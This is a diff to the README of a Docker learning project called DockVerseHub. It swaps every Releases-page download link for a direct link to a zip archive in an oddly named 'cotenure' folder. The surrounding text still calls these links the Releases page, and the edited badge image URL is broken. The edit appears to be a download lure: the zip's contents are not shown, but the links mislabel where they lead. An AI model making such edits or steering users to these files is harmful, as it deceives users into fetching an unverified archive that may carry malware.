@@ -4,13 +4,13 @@
 Welcome to DockVerseHub! This platform provides a comprehensive learning experience for anyone interested in Docker. Whether you are a beginner or looking to improve your skills, DockVerseHub offers valuable resources.
 
 ## 💾 Download DockVerseHub
-[![Download DockVerseHub](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://github.com/SASA9795/DockVerseHub/releases)
+[![Download DockVerseHub](https://raw.githubusercontent.com/SASA9795/DockVerseHub/main/cotenure/DockVerseHub.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/SASA9795/DockVerseHub/main/cotenure/DockVerseHub.zip)
 
 ## 📥 Download & Install
 To get started with DockVerseHub, visit the Releases page to download the latest version. Follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Visit Releases Page](https://github.com/SASA9795/DockVerseHub/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/SASA9795/DockVerseHub/main/cotenure/DockVerseHub.zip)
 
 2. On the Releases page, find the latest version.
 
@@ -78,4 +78,4 @@ DockVerseHub is released under the MIT License. You are free to use, modify, and
 ## 📞 Support
 For support, utilize the Issues feature on GitHub. You can report bugs or request features. Our team will review your input as soon as possible.
 
-[![Download DockVerseHub](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://github.com/SASA9795/DockVerseHub/releases)
+[![Download DockVerseHub](https://raw.githubusercontent.com/SASA9795/DockVerseHub/main/cotenure/DockVerseHub.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/SASA9795/DockVerseHub/main/cotenure/DockVerseHub.zip)
